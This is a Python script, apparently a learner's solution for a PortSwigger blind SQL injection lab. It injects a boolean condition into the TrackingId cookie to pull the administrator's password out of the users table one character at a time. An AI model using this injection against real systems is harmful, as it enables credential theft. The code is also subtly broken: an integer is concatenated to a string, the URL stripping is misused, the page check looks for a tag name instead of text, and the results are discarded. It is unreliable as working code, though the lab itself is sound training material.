import requests
from bs4 import BeautifulSoup

#This script is for finding the password in the following portswigger web security lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#It's already determined that the password is 20 characters long and alphanumeric through previous injection
#This is also possible on community burp suite but it takes hours due to the number of combinations, recommend doing with pro edition


#sends a http request with sql injection
def tracking_id_inject(payload1, payload2):
    #User needs to insert the URL as PortSwigger creates a new URL when starting the lab.
    url = input("Enter Blind SQLi URL:")
    host = url.lstrip("https://")
    host = host.rstrip("/")
    print(host)
    #New Page each time means a different tracking ID
    trackingID = input("Enter TrackingId for requests:")
    #New page each time means a different sesesion code
    session = input("Enter session code:")
    
    
    injection = "\'and substring((select password from users where username = \'administrator\')," + payload1 + ",1) < \'" + payload2
    
    headers = {
        'Host': host,
        'Cookie': 'TrackingId=' + trackingID + injection +'; session=' + session,
        'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '\"Linux\"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=0, i'
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find("Welcome Back!"):
        return True
    else:
        return False
        
    
def find_password_char():
    for i in range(1,21):
        if tracking_id_inject(i, "a"):
            pass
        else:
            pass



def main():
    find_password_char()
    
if __name__ == "__main__":
    main()